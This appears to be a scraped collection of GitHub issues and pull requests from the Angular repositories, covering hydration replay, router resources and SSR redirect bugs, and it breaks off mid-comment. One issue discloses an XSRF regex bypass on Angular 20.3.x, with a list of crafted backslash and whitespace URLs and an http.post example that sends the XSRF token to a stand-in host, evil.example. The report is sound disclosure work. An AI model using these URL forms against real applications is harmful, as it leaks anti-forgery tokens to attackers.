Issues.Title: fix(core): replay events dispatched during an in-flight hydration
Issues.Body:
## PR Checklist

- [x] The commit message follows our guidelines: https://github.com/angular/angular/blob/main/contributing-docs/commit-message-guidelines.md
- [x] Tests for the changes have been added (for bug fixes / features)

- [ ] Build related changes
- [ ] CI related changes
- [ ] Documentation content changes
- [ ] angular.dev application / infrastructure changes
- [ ] Other... Please describe:

## What is the current behavior?

Fixes #71296.

When an event is replayed for a defer block that is already being hydrated (for example by a viewport trigger), `triggerHydrationFromBlockName` returns early and the replay function is dropped, so the event is never invoked.

Issue Number: #71296

## What is the new behavior?

The replay now waits for the in-flight hydration to finish and then replays the queued events for that block. A new spec in `incremental_hydration_spec.ts` fails before the change and passes after it.

## Does this PR introduce a breaking change?

- [ ] Yes
- [x] No

## Other information

Docs unticked: no documentation is affected.

Issues.Title: docs: show the loading state when reloading a resource in the signals tutorial
Issues.Body:
In the signals tutorial's async data step, the answer computes isLoading from status() === 'loading'. After a call to reload() the resource reports 'reloading', so the loading message never appears when the Reload button is clicked.

Use the resource's isLoading() signal, which is true for both 'loading' and 'reloading', and list 'reloading' among the statuses in the README.

Issues.Title: fix(core): mark component view dirty on ComponentRef markForCheck
Issues.Body:
`ComponentRef.changeDetectorRef` wraps the root host view, so `markForCheck()` only marked that root view and its ancestors. The component's own view was never flagged, and an OnPush component got skipped on the next change detection. This is why `fixture.changeDetectorRef.markForCheck()` did nothing in zoneless tests.

The ref now passes the component view as its `_cdRefInjectingView`, so `markForCheck()` marks the component view and walks up from there, the same as an injected `ChangeDetectorRef`. `detectChanges()` still runs from the root view.

Fixes #71293
Issues.RelatedDescription: Closed or merged PR "fix(core): mark component view dirty on ComponentRef markForCheck" (#71297)

Issues.Title: fix(router): expose a public RouteResource type for route resources
Issues.Body:
## PR Checklist

Please check if your PR fulfills the following requirements:

- [x] The commit message follows our guidelines: https://github.com/angular/angular/blob/main/contributing-docs/commit-message-guidelines.md
- [x] Tests for the changes have been added (for bug fixes / features)
- [x] Docs have been added / updated (for bug fixes / features)

## PR Type

What kind of change does this PR introduce?

<!-- Please check the one that applies to this PR using "x". -->

- [x] Bugfix
- [ ] Feature
- [ ] Code style update (formatting, local variables)
- [ ] Refactoring (no functional changes, no api changes)
- [ ] Build related changes
- [ ] CI related changes
- [ ] Documentation content changes
- [ ] angular.dev application / infrastructure changes
- [ ] Other... Please describe:

## What is the current behavior?

<!-- Please describe the current behavior that you are modifying, or link to a relevant issue. -->

A `nonBlocking()` route resource is bound to a component input as the router-wrapped resource, which supports `reload()` but not `set()` or `update()`. There is no public type for it: `Resource<T>` has no `reload()`, and `WritableResource<T>` / `ResourceRef<T>` declare methods the router-wrapped resource does not implement. Users have to declare their own `Resource<T> & {reload(): boolean}` to type the input. #70702 gave `ActivatedRoute.resources` a `reload()` through an anonymous intersection in `ResourceResult`, which cannot be reused for component inputs.

Issue Number: #71299

## What is the new behavior?

`RouteResource<T>` is exported from `@angular/router` and used as the value type of `ResourceResult`, so a non-blocking resource input can be declared as `input.required<RouteResource<T>>()` and `reload()` can be called on it without a cast. The data fetching guide uses this type in the non-blocking example.

The name follows the "route resources" terminology of the routing guide and `Route.resources`.

## Does this PR introduce a breaking change?

- [ ] Yes
- [x] No

<!-- If this PR contains a breaking change, please describe the impact and migration path for existing applications below. -->

## Other information

This keeps the type in `@angular/router`. A framework-wide `ReloadableResource<T>` in `@angular/core`, mentioned in the #70702 review, is left out of this PR.
Issues.RelatedDescription: Open PR "fix(router): expose a public RouteResource type for route resources" (#71300)

Issues.Title: Incremental hydration: a click that lands while a block is already hydrating is captured by event replay but never replayed
Issues.Body:
### Which @angular/* package(s) are the source of the bug? core ### Is this a regression? No (same code on `main` today) ### Description With `provideClientHydration(withIncrementalHydration(), withEventReplay())`, a `@defer (hydrate on viewport)` block containing a `routerLink` anchor loses any click that lands after the viewport trigger has started hydration but before it finishes. The jsaction contract captures the click and calls `preventDefault()`, so the browser does not navigate either. The event is queued for replay but never replayed, and once hydration completes the `jsaction` attribute is removed. The user clicks a link and nothing happens. The same click works if it is the first thing to trigger hydration (before the viewport trigger fires), and after hydration has finished. Only the in-flight window is affected. That window is the lazy chunk fetch plus the block's first render, so it is a few ms on localhost, hundreds of ms on a mobile connection or a throttled CPU, and it opens exactly when the user has just scrolled the content into view. Any non-replay trigger has the same effect (`viewport`, `idle`, `timer`, `immediate`, `when`, a parent block hydrating), because the cause is in how a second hydration request is handled: 1. `hydrateAndInvokeBlockListeners` (`packages/core/src/hydration/event_replay.ts`) pushes the event onto `EVENT_REPLAY_QUEUE` and calls `triggerHydrationFromBlockName(injector, blockName, replayFn)`. 2. `triggerHydrationFromBlockName` (`packages/core/src/defer/triggering.ts`) sees the block in `dehydratedBlockRegistry.hydrating` and returns immediately, dropping `replayFn`. 3. The in-flight hydration was started by `setViewportTriggers` with no replay function, so `triggerHydrationForBlockQueue` never drains the queue (`if (replayQueuedEventsFn) { replayQueuedEventsFn(hydrationQueue); }`). 4. `cleanupHydratedDeferBlocks` removes `jsaction` / `ngb` from the block's elements. The event stays in the queue forever. A fix could be either of: - in the early-return path, attach the replay to the in-flight hydration, e.g. `blocksBeingHydrated.get(blockName).promise.then(() => replayQueuedEventsFn?.([blockName]))`, or - have `triggerHydrationForBlockQueue` always drain the shared queue for the blocks it hydrated, regardless of which trigger started it. ### Please provide a link to a minimal reproduction of the bug https://github.com/stones/angular-incremental-hydration-click-replay (a fresh `ng new repro --ssr` with the files below, plus `probe.cjs`) Changes over the CLI scaffold: - `app.config.ts`: `provideClientHydration(withIncrementalHydration(), withEventReplay())`, `provideRouter(routes, withEnabledBlockingInitialNavigation())`. - `app.routes.ts`: `''` → `HomeComponent`, `'target'` → `TargetComponent` (renders "TARGET PAGE"). - `app.routes.server.ts`: `{ path: '**', renderMode: RenderMode.Server }`. - `home.component.ts`: a 3000px spacer, then `@defer (hydrate on viewport) { } @placeholder {

placeholder

}`. - `slow-section.component.ts`: standalone, imports `RouterLink`, template `Go to target`; `onClick` logs `handler ran`. Steps: ``` npm install npm run build NG_ALLOWED_HOSTS=localhost PORT=4017 node dist/repro/server/server.mjs ``` 1. Open `http://localhost:4017/`. In DevTools, throttle the network to "Slow 3G" so the chunk fetch is long enough to click inside. 2. Scroll the link into view. The IntersectionObserver fires and the `slow-section` chunk is requested. 3. Click "Go to target" while the chunk is still loading. 4. Nothing happens. The URL stays `/`, `handler ran` is never logged, and when the chunk arrives the anchor's `jsaction` attribute is gone. Controls: `document.getElementById('link').click()` from the console before scrolling navigates (replay triggers hydration and is replayed). Clicking after the chunk has loaded navigates. Automated: `node probe.cjs 5 50,300,800 dom,mouse 1000` runs the three scenarios in Playwright Chromium with 1000 ms of artificial latency on the lazy chunk. Results on 22.0.8: | Scenario | runs | navigated | handler ran | `jsaction` stripped after click | | --- | --- | --- | --- | --- | | click before the viewport trigger fires | 15 | 15 | 15 | 0 | | click during hydration (50 / 300 / 800 ms after scroll) | 40 | **0** | **0** | **40** | | click after hydration finished | 25 | 25 | 25 | 0 | Both `element.click()` and a real `page.mouse.click()` behave the same. ### Please provide the exception or error you saw No error. The click is silently dropped. ### Please provide the environment you discovered this bug in ``` Angular CLI: 22.0.9 Node: 24.18.0 Package Manager: npm OS: win32 x64 @angular/core 22.0.8 (also common, router, platform-browser, platform-server) @angular/ssr 22.0.9 @angular/build 22.0.9 ``` ### Anything else? Separate observation, possibly its own issue or docs gap: with the CLI default `provideRouter(routes)` (non-blocking initial navigation) the `hydrate on viewport` trigger in this app never registers. `withIncrementalHydration()`'s `APP_BOOTSTRAP_LISTENER` runs `runIncrementalHydrationBootstrap`, which is a no-op until `ɵɵenableIncrementalHydrationRuntime()` has run, and the compiler emits that call in the create block of the first template containing a hydrate block, which the router has not rendered when bootstrap finishes. The repro uses `withEnabledBlockingInitialNavigation()` to get past this.
Issues.RelatedDescription: Open issue "Incremental hydration: a click that lands while a block is already hydrating is captured by event replay but never replayed" (#71296)

Issues.Title: XSRF header is still sent to other origins on 20.3.x through backslash and whitespace URLs
Issues.Body:
### Which @angular/* package(s) are the source of the bug?

common

### Is this a regression?

No

### Description


On 20.3.x, the GHSA-58c5-g7wp-6w37  fix in `xsrfInterceptorFn` decides whether to add the XSRF header with a [regex](https://github.com/angular/angular/blob/2e8bde1d858502efb458783a34be2a1c36f215fd/packages/common/http/src/xsrf.ts#L88-L105):

```ts
const ABSOLUTE_URL_REGEX = /^(?:https?:)?\/\//i;

if (
  !inject(XSRF_ENABLED) ||
  req.method === 'GET' ||
  req.method === 'HEAD' ||
  ABSOLUTE_URL_REGEX.test(req.url)
) {
  return next(req);
}
```

The browser does not resolve `req.url` the way this regex reads it. For `http`/`https`, the WHATWG URL parser treats `\` as `/`, strips leading spaces and C0 control characters, and removes tab, LF and CR anywhere. So these URLs do not match the regex and get the token, but the browser sends them to `evil.example`:

```ts
const urls = [
  '/\\evil.example/x',
  '\\\\evil.example/x',
  '\\/evil.example/x',
  ' //evil.example/x',
  '\t//evil.example/x',
  '/\t/evil.example/x',
  '/\n/evil.example/x',
  '/\r/evil.example/x',
  '\0//evil.example/x',
  '\x1f//evil.example/x',
  'https:\\\\evil.example/x',
  'https:/\\evil.example/x',
  'htt\tps://evil.example/x',
];
```

Minimal example:

```ts
document.cookie = 'XSRF-TOKEN=test-token; Path=/';

http.post('/\\evil.example/api', {}).subscribe();
```

The request to `evil.example` contains:

```http
X-XSRF-TOKEN: test-token
```

The precondition is the same as in GHSA-58c5-g7wp-6w37: the attacker can make the app send a mutating request to a URL they control. Their server only has to allow the origin and the custom header through CORS.

`//evil.example/x` and `https://evil.example/x` are correctly skipped on 20.3.33. `'/\\evil.example/x'` starts with a single `/` and has no scheme, so it also passes a `url.startsWith('/')` check.

`main`, 21.0.3+ and 22.x are not affected, because #65683 replaced the regex with a `new URL(req.url, locationOrigin).origin` comparison. It never reached 20.3.x, which is in LTS, so `20.3.33` is still affected.

I tested Angular **20.3.33**  and **22.2.2** in **Chrome 154**, with both `provideHttpClient()` and `withFetch()`, 3 runs each:

| Page | Token sent to `evil.example` on 20.3.33 | 22.2.2 |
| --- | --- | --- |
| `http://` | all forms above, and their `http:` spellings | 0 |
| `https://` | all forms above (`http:` spellings are blocked as mixed content) | 0 |
| `https://` + CSP `upgrade-insecure-requests` | all forms above, and the 5 `http:` spellings (e.g. `http:\\evil.example/x`, `http:evil.example/x`) | 0 |



### Please provide a link to a minimal reproduction of the bug

https://github.com/SkyZeroZx/angular-xsrf-origin-bypass-poc
 

### Anything else?

According my research, the regex is in 20.3.14–20.3.33 (also 19.2.16–19.2.25 and 21.0.1–21.0.2).
Issues.RelatedDescription: Open issue "XSRF header is still sent to other origins on 20.3.x through backslash and whitespace URLs" (#71294)

Issues.Title: fix(compiler): check `@boundary` blocks in the control flow content projection diagnostic
Issues.Body:
## PR Checklist Please check if your PR fulfills the following requirements: - [x] The commit message follows our guidelines: https://github.com/angular/angular/blob/main/contributing-docs/commit-message-guidelines.md - [x] Tests for the changes have been added (for bug fixes / features) - [ ] Docs have been added / updated (for bug fixes / features) ## PR Type What kind of change does this PR introduce? - [x] Bugfix - [ ] Feature - [ ] Code style update (formatting, local variables) - [ ] Refactoring (no functional changes, no api changes) - [ ] Build related changes - [ ] CI related changes - [ ] Documentation content changes - [ ] angular.dev application / infrastructure changes - [ ] Other... Please describe: ## What is the current behavior? A `@boundary` block copies the tag name and attributes of its single root node for content projection, like `@if`, `@for` and `@switch`, but NG8011 doesn't check it: ```html @boundary {

Title

Subtitle

} ``` `

` is projected into the default slot instead of `[card-title]`, and nothing is reported. `TcbControlFlowContentProjectionOp.findPotentialControlFlowNodes` only collects `@if`, `@for` and `@switch` blocks. Issue Number: Fixes #71288 ## What is the new behavior? `findPotentialControlFlowNodes` also collects `@boundary` blocks, so the template above gets the same NG8011 warning as an `@if` (the message takes the block name from the template, so it says "the surrounding @boundary"). I added two tests: one with two root nodes, which is reported, and one with a single root node, which isn't. The first one fails without the change. `@error` blocks aren't checked. They don't copy the tag name and attributes of their root node, so even a single root node isn't projected into a specific slot, and the suggestions in the message wouldn't help. The issue has more details on that difference. ## Does this PR introduce a breaking change? - [ ] Yes - [x] No ## Other information The generated code doesn't change. New warnings can only show up in templates that put a `@boundary` block with several root nodes inside a component with `ng-content` selectors, and `@boundary` is in developer preview.
Issues.RelatedDescription: Open PR "fix(compiler): check `@boundary` blocks in the control flow content projection diagnostic" (#71289)

Issues.Title: Support `scroll` from `NavigationBehaviorOptions` in `RouterLink`
Issues.Body: ### Which @angular/* package(s) are relevant/related to the feature request? router ### Description `NavigationBehaviorOptions` got a `scroll` option in a03c82564d (#64417, for #26744), so a single navigation can opt out of scrolling. It works with `router.navigate()` and `router.navigateByUrl()`, but `RouterLink` has no matching input, so it can't be used from a template. Where I ran into it: tabs driven by a query param (`?tab=reviews`) further down a page, with `withInMemoryScrolling({scrollPositionRestoration: 'top'})`. Every click on a tab jumps back to the top of the page. #26744 is locked now, but it has plenty of the same cases (a `page` param for infinite scroll, a `?sidebar` param, an auxiliary route opening a modal), and most of those navigations start from a link rather than from code. It also matters for the Navigation API integration: `extras.scroll` is what the router passes to `NavigateEvent#intercept({scroll})`, and a navigation started by a `RouterLink` has no way to set it. `RouterLink` already forwards `skipLocationChange`, `replaceUrl`, `state`, `info` and `browserUrl` (the last one was added for #66805). `scroll` isn't forwarded yet. ### Proposed solution A `scroll` input on `RouterLink`, typed from `NavigationBehaviorOptions['scroll']` and passed to `router.navigateByUrl` with the other extras: ```html Reviews ``` #70963 implements this the same way `browserUrl` was added: the key is only put in the extras when the input is set, so navigations from links that don't use it are unchanged. ### Alternatives considered - Replacing the link with a `(click)` handler that calls `router.navigate(..., {scroll: 'manual'})`. That gives up the `href` (no ctrl/cmd+click, no "open in new tab", no link semantics for screen readers) and `routerLinkActive`. - The workarounds people posted in #26744 before the option existed: a fragment that doesn't match anything on the page, a dynamic getter on `scrollPositionRestoration`, or `location.replaceState` to bypass the router. They all still apply to links today.
Issues.RelatedDescription: Open issue "Support `scroll` from `NavigationBehaviorOptions` in `RouterLink`" (#71287)

Issues.Title: fix(router): substitute redirect function placeholders at most once
Issues.Body:
Previously, a string returned by a `RedirectFunction` went through the same placeholder substitution as a static `redirectTo`. When the function builds that string from request data, the request can add `:name` segments and query values that all reference the same parameter, even through `encodeURIComponent` since parsing decodes `%3A` back to `:`. The redirected URL then grew with the square of the request size, and a name such as `:constructor` failed the navigation.

A string returned by a function now substitutes each path and query parameter at most once. A repeated `:name`, or one that is not a parameter, is kept as written instead of failing with NG04001. Static `redirectTo` strings are unchanged.

Fixes #71284
Issues.RelatedDescription: Closed or merged PR "fix(router): substitute redirect function placeholders at most once" (#71285)

Issues.Body:
## PR Checklist

Please check if your PR fulfills the following requirements:

## PR Type

What kind of change does this PR introduce?

- [ ] Bugfix
- [ ] Feature
- [ ] Code style update (formatting, local variables)
- [ ] Refactoring (no functional changes, no api changes)
- [ ] Build related changes
- [ ] CI related changes

## What is the current behavior?

The resource reference in the angular-developer skill says `value()` returns "The resolved data, or `undefined`". The skill's example also shows "Loading..." for a failed request, and `http-client.md` in the same skill already says `value()` throws in the error state.

An agent following the skill can generate `resource.value()?.name` in a template or computed signal, which throws as soon as a request fails.

Issue Number: N/A

## What is the new behavior?

`resource.md` now states that `value()` throws in the `'error'` status and that `hasValue()` is `false` without throwing there. It also covers what `isLoading()` includes, adds a status-to-`value()` table, and shows an error branch in the example. The table was checked against `@angular/core` 22.3.0-next.1 by driving a resource through idle, loading, resolved, error, reloading and local states.

## Does this PR introduce a breaking change?

- [ ] Yes
- [x] No

Issues.Title: fix(language-service): await hybridCompiler.ensureReady before handling project requests
Issues.Body:
In the Language Server Protocol, notifications such as `textDocument/didClose` and `workspace/didChangeWatchedFiles` trigger asynchronous background file invalidation and recompilation in `HybridCompiler`. Diagnostic requests already await `hybridCompiler.ensureReady()`, but request handlers wrapped by `withProject` (`onHover`, `onDefinition`, `onCompletion`, etc.) were dispatching immediately without awaiting pending compilations.

This updates `withProject` and `onCompletionResolve` to await `info.project.hybridCompiler.ensureReady()` so that any pending compiler invalidation passes settle before language service queries are executed.

Issues.Title: fix(compiler): do not scope comments placed inside of a selector
Issues.Body:
## PR Checklist

Please check if your PR fulfills the following requirements:

- [x] The commit message follows our guidelines: https://github.com/angular/angular/blob/main/contributing-docs/commit-message-guidelines.md
- [x] Tests for the changes have been added (for bug fixes / features)
- [ ] Docs have been added / updated (for bug fixes / features)

## PR Type

What kind of change does this PR introduce?

- [x] Bugfix
- [ ] Feature
- [ ] Code style update (formatting, local variables)
- [ ] Refactoring (no functional changes, no api changes)
- [ ] Build related changes
- [ ] CI related changes
- [ ] Documentation content changes
- [ ] angular.dev application / infrastructure changes
- [ ] Other... Please describe:

## What is the current behavior?

`ShadowCss` replaces comments with a `%COMMENT%` placeholder before scoping. A comment placed inside of a selector, rather than before the whole rule, becomes a selector part of its own and receives the content attribute. This changes what the rule matches:

- `.a /* comment */ {}` becomes `.a[c] [c] {}`
- `.a, /* comment */ .b {}` becomes `.a[c], [c] .b[c] {}`
- `.a /* comment */ .b {}` becomes `.a[c] [c] .b[c] {}`

The scoped rules require an extra element carrying the attribute, so they no longer match the intended elements. Comments are only removed from component styles by minification, so this shows up in dev builds.

Issue Number: N/A

## What is the new behavior?

Selector parts that only consist of comment placeholders are left untouched, so the comments are dropped without changing the selector. Comments inside a compound selector (`.a/* c */.b`) are still scoped normally. Specs are added for comments between a selector and its block, in selector lists, between compound selectors and combinators, inside `:host` and `:is()`, and inside a compound selector.

## Does this PR introduce a breaking change?

- [ ] Yes
- [x] No
Issues.RelatedDescription: Open PR "fix(compiler): do not scope comments placed inside of a selector" (#71275)

Issues.Title: `ng completion` should apply to interactive shells only
Issues.Body:
### Command

`completion`

### Description

`ng completion` adds the following line to `~/.bashrc`:

```bash
source <(ng completion script)
```

This makes shell startup times a bit slower, and also applies to shells used by coding agents, which are commonly used nowadays. For these kinds of shells, it only introduces overhead without any benefit.

### Describe the solution you'd like

Make it apply to interactive shells only:

```bash
if [[ $- == *i* ]]; then
  source <(ng completion script)
fi
```

and update the [documentation](https://angular.dev/cli/completion).

If the team disagrees with this change, then perhaps a mention in the ["Manual setup" section of the documentation page](https://angular.dev/cli/completion#manual-setup) is better than nothing.
Issues.RelatedDescription: Open issue "`ng completion` should apply to interactive shells only" (#34307)

## What is the current behavior?

Issue Number: #32787

Running `ng update @angular/core` from an Angular app inside an npm workspace prints `Found 0 dependencies.` and fails with `Package '@angular/core' is not a dependency.` An outdated CLI hands over to a temporary install of the latest one, so upgrading from an older version fails the same way. The issue has 23 reactions and several users report the same failure.

`getCurrentPackageName` parses the output of `npm pkg get name`. Inside a workspace member npm prints an object keyed by the workspace name (`{ "app": "app" }`) instead of a string. That object was used as the package name, so `parseNpmLikeDependencies` never found the member's dependencies.

## What is the new behavior?

The command output is only used if it's a string. Otherwise the name comes from the `package.json` in the current directory. `ng update` now lists the dependencies of the workspace member.

Added specs for the name and the dependencies of a workspace member. `pnpm bazel test //packages/angular/cli:test` passes.

- [x] No

Issues.Title: fix(@angular/ssr): resolve relative redirects against the parent route
Issues.Body:
Fixes #34300

## PR Checklist

Please check to confirm your PR fulfills the following requirements:

<!-- Please check all that apply using "x". -->

- [x] The commit message follows our guidelines: https://github.com/angular/angular-cli/blob/main/CONTRIBUTING.md#-commit-message-guidelines
- [x] Tests for the changes have been added (for bug fixes / features)
- [ ] Docs have been added / updated (for bug fixes / features)

## PR Type

What kind of change does this PR introduce?

<!-- Please check the one that applies to this PR using "x". -->

- [x] Bugfix
- [ ] Feature
- [ ] Code style update (formatting, local variables)
- [ ] Refactoring (no functional changes, no api changes)
- [ ] Build related changes
- [ ] CI related changes
- [ ] Documentation content changes
- [ ] Other... Please describe:

## What is the current behavior?

<!-- Please describe the current behavior that you are modifying, or link to a relevant issue. -->

Issue Number: #34300

A relative `redirectTo` is resolved on the server by removing only the last segment of the full route path. For a route whose own path has several segments, `{ path: 'old/page', redirectTo: 'new/page' }` redirects `/old/page` to `/old/new/page`, while the router navigates to `/new/page`, as it replaces all segments matched by the route.

## What is the new behavior?

<!-- Please describe the new behavior that. -->

Relative redirects are resolved against the parent route path, which `traverseRoutesConfig` already passes down. This matches the router for multi-segment paths, empty paths and catch-all routes, including prerendered routes with `getPrerenderParams`, where the parameters are substituted into the parent path (previously a `**` expanded to several segments shifted the base, e.g. `docs/**` with `a/b` redirected to `/docs/a/new` instead of `/new`).

Single-segment and empty-path routes resolve exactly as before.

## Does this PR introduce a breaking change?

- [ ] Yes
- [x] No

<!-- If this PR contains a breaking change, please describe the impact and migration path for existing applications below. -->

This changes the redirect target only for relative redirects on routes whose own path has more than one segment. The previous target was never a URL the router would navigate to, so this is treated as a fix. The two `app_spec.ts` expectations that asserted the previous result (`redirect/relative` → `/redirect/home`, `redirect/:param/relative` → `/redirect/param/home`) now expect the router's result `/home`. If you consider this breaking, I'm happy to adjust.

## Other information

Tests: new cases in `ng-routes_spec.ts` (multi-segment path under a parameter, prerendered multi-segment path with `getPrerenderParams`, prerendered `**` with `getPrerenderParams`) and `app_spec.ts` (relative redirect under a parameterized parent route through `app.handle`). Verified locally with `//packages/angular/ssr/test:test`, the `tests/build/server-rendering` e2e tests (esbuild, Node 24) and `ng-dev release build`.

Not covered by this change: positional parameters in `redirectTo` itself (`redirectTo: 'profile/:id'`) are still emitted literally, as before.

Related: #34299 (query string on relative redirects, #34298). Both change the end of `resolveRedirectTo`, so whichever lands second needs a small rebase.
Issues.RelatedDescription: Open PR "fix(@angular/ssr): resolve relative redirects against the parent route" (#34301)

Issues.Title: SSR resolves relative `redirectTo` against the wrong base when the route path has several segments
Issues.Body:
### Command

other

### Is this a regression?

- [ ] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

_No response_

### Description

When a request matches a route with a string `redirectTo`, `@angular/ssr` answers with a 302 built from the route config, without running the router. If the route's own `path` has more than one segment, a **relative** `redirectTo` is resolved against the wrong base.

`{ path: 'old/page', redirectTo: 'new/page' }`:

- Server: `GET /old/page` returns `Location: /old/new/page` (a 404).
- Router (in-app navigation to `/old/page`): `/new/page`.

The router replaces all segments matched by the redirecting route (`old/page`). The server only removes the last one (`page`). Routes whose path is a single segment or empty are not affected, which is probably why this has gone unnoticed.

**Note: fixing this changes current behaviour.** `app_spec.ts` asserts the current result ([L207-L217](https://github.com/angular/angular-cli/blob/6ecbadaba2c3b3493b67d10b7757d8974bf9b8a1/packages/angular/ssr/test/app_spec.ts#L207-L217): `redirect/relative` → `/redirect/home`, the router gives `/home`), and an app could depend on it if it happens to have a route at the server-computed path.

### Minimal Reproduction

```sh
npx @angular/cli@22.2.2 new repro-app --ssr --defaults
cd repro-app
```

`src/app/app.routes.ts`:

```ts
import { Component } from '@angular/core';
import { Routes } from '@angular/router';

@Component({ template: 'New page' })
class NewPage {}

export const routes: Routes = [
  { path: 'old/page', redirectTo: 'new/page' },
  { path: 'new/page', component: NewPage },
];
```

`src/app/app.routes.server.ts` (server rendering, so the request reaches the redirect handling instead of a prerendered redirect page):

```ts
import { RenderMode, ServerRoute } from '@angular/ssr';

export const serverRoutes: ServerRoute[] = [{ path: '**', renderMode: RenderMode.Server }];
```

```sh
npx ng build
NG_ALLOWED_HOSTS=localhost PORT=4000 node dist/repro-app/server/server.mjs
curl -si 'localhost:4000/old/page' | grep -i '^location'
```

Expected: `location: /new/page` (where the router navigates). Actual: `location: /old/new/page`.

### Exception or Error

```text
$ curl -si localhost:4000/old/page | head -3
HTTP/1.1 302 Found
X-Powered-By: Express
location: /old/new/page
```

### Anything else relevant?

Related: #33504 / #33516 (parameters in the same function).

I have a fix with tests and will open a PR for it. It updates the two `app_spec` expectations above to the router's result. If the current behaviour is intended, or this should wait for a major, I'm happy to adjust.

Not browser specific. Seen with the default Express `server.ts` generated by `ng new --ssr`; the redirect comes from `AngularNodeAppEngine.handle()`, not from Express itself.

Issues.Title: fix(@angular/ssr): preserve query parameters on relative route redirects
Issues.Body:
Fixes #34298

## PR Checklist

Please check to confirm your PR fulfills the following requirements:

<!-- Please check all that apply using "x". -->

- [x] The commit message follows our guidelines: https://github.com/angular/angular-cli/blob/main/CONTRIBUTING.md#-commit-message-guidelines
- [x] Tests for the changes have been added (for bug fixes / features)
- [ ] Docs have been added / updated (for bug fixes / features)

## PR Type

What kind of change does this PR introduce?

<!-- Please check the one that applies to this PR using "x". -->

- [x] Bugfix
- [ ] Feature
- [ ] Code style update (formatting, local variables)
- [ ] Refactoring (no functional changes, no api changes)
- [ ] Build related changes
- [ ] CI related changes
- [ ] Documentation content changes
- [ ] Other... Please describe:

## What is the current behavior?

<!-- Please describe the current behavior that you are modifying, or link to a relevant issue. -->

Issue Number: #34298

Route redirects with a string `redirectTo` are answered on the server from the extracted route tree, without running the router. For a relative `redirectTo`, the query string of the request is dropped (`/search?q=x` → `Location: /search/results`), while the router keeps it (`/search/results?q=x`).

## What is the new behavior?

<!-- Please describe the new behavior that. -->

The server now matches the router for relative redirects:

- The query string of the request is kept (`/search?q=x` → `/search/results?q=x`), also with `X-Forwarded-Prefix`.
- A query or fragment written in a relative `redirectTo` is ignored, as the router ignores it.
- Absolute redirects are unchanged; the router does not keep the request query for them either.

Whether `redirectTo` was relative is no longer known at request time, as it is resolved to an absolute path during route extraction. It is therefore recorded as an internal `relativeRedirect` flag on the route tree metadata, which is only set for relative redirects.

## Does this PR introduce a breaking change?

- [ ] Yes
- [x] No

<!-- If this PR contains a breaking change, please describe the impact and migration path for existing applications below. -->

## Other information

Tests: new cases in `app_spec.ts` (relative keeps the query, `redirectTo` query is ignored, absolute drops it, `X-Forwarded-Prefix` + query) and `ng-routes_spec.ts` (no flag on absolute redirects, query and fragment stripped for server and prerender routes). Verified locally with `//packages/angular/ssr/test:test`, the `tests/build/server-rendering` e2e tests (esbuild, Node 24) and `ng-dev release build`.

Not covered by this change:

- With `outputMode: 'static'`, prerendered redirect routes are static redirect pages with a fixed target, so the request query cannot be carried over there.
- `:name` query parameters copied by absolute redirects (`redirectTo: '/search?q=:term'`) are still not emulated, as before.

A separate issue and PR follow for relative redirects from multi-segment paths (`old/page` → `/old/new/page`). Both change the end of `resolveRedirectTo`, so whichever lands second needs a small rebase.

Issues.Title: SSR route redirects drop the query string on relative `redirectTo`
Issues.Body:
### Command

other

### Is this a regression?

- [ ] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

_No response_

### Description

When a request matches a route with a string `redirectTo`, `@angular/ssr` answers with a 302 built from the route config, without running the router. For a **relative** `redirectTo`, the query string of the request is dropped.

The Angular router keeps it: a relative redirect only rewrites the matched segments and continues with the rest of the URL. So `/search?q=x` with `{ path: '', redirectTo: 'results' }` under `search` ends up at `/search/results?q=x` with in-app navigation, but at `/search/results` on a full page load (direct link, reload, link from an email).

For absolute redirects the router drops the query as well, so these already agree.

### Minimal Reproduction

```sh
npx @angular/cli@22.2.2 new repro-app --ssr --defaults
cd repro-app
```

`src/app/app.routes.ts`:

```ts
import { Component } from '@angular/core';
import { Routes } from '@angular/router';

@Component({ template: 'Results page' })
class Results {}

export const routes: Routes = [
  {
    path: 'search',
    children: [
      { path: '', redirectTo: 'results', pathMatch: 'full' },
      { path: 'results', component: Results },
    ],
  },
];
```

`src/app/app.routes.server.ts` (server rendering, so the request reaches the redirect handling instead of a prerendered redirect page):

```ts
import { RenderMode, ServerRoute } from '@angular/ssr';

export const serverRoutes: ServerRoute[] = [{ path: '**', renderMode: RenderMode.Server }];
```

```sh
npx ng build
NG_ALLOWED_HOSTS=localhost PORT=4000 node dist/repro-app/server/server.mjs
curl -si 'localhost:4000/search?q=x' | grep -i '^location'
```

Expected: `location: /search/results?q=x` (where the router navigates). Actual: `location: /search/results`.

### Exception or Error

```text
$ curl -si 'localhost:4000/search?q=x' | head -3
HTTP/1.1 302 Found

location: /search/results

│ typescript                │ 6.0.3             │ ~6.0.2            │
└───────────────────────────┴───────────────────┴───────────────────┘
```

### Anything else relevant?

[`app.ts#L168-L176`](https://github.com/angular/angular-cli/blob/6ecbadaba2c3b3493b67d10b7757d8974bf9b8a1/packages/angular/ssr/src/app.ts#L168-L176) builds `Location` from the stored `redirectTo` and never uses `url.search`. By then `redirectTo` has already been resolved to an absolute path, so whether it was relative is no longer known.

Router side: for a relative redirect, `recognize.ts` keeps only the segments of the new tree and continues with the original URL tree, so the query is kept. An absolute redirect throws `AbsoluteRedirect(newTree)`, whose query comes from `redirectTo` only. Render-time redirects (guards, `router.navigate`) already keep the query (#31883).

I have a fix with tests and will open a PR for it.

Not browser specific. Seen with the default Express `server.ts` generated by `ng new --ssr`; the redirect comes from `AngularNodeAppEngine.handle()`, not from Express itself.

Issues.Title: perf(@angular/build): resolve asset patterns concurrently with bounded concurrency
Issues.Body:
Avoid sequentially globbing asset entries one-by-one in `resolveAssets` by utilizing `mapConcurrent` bounded by `MAX_CONCURRENT_READS` (`16`).
Additionally, add a fast path for static, non-dynamic file patterns using direct file stats instead of directory walks.

Micro-benchmark on synthetic library fixtures with secondary entry points:
| Entries | Before | After | Delta / Speedup |
| ------: | -----: | ----: | :-------------- |
| 10 | 2.29ms | 0.50ms | -1.79ms (4.6x faster) |
| 50 | 10.09ms | 2.19ms | -7.90ms (4.6x faster) |
| 300 | 59.98ms | 10.08ms | -49.90ms (6.0x faster) |
| 1,000 | 176.60ms | 35.00ms | -141.60ms (5.0x faster) |
| 2,000 | 356.61ms | 69.48ms | -287.12ms (5.1x faster) |

Issues.Title: test(@angular/build): add library builder scaling benchmark suite
Issues.Body:
Measuring that Angular's native library builder scales with grace — far better than ng-packagr: ng-packagr/ng-packagr#3461


<!--
Draft PR description for a pull request against angular/angular-cli, adding the
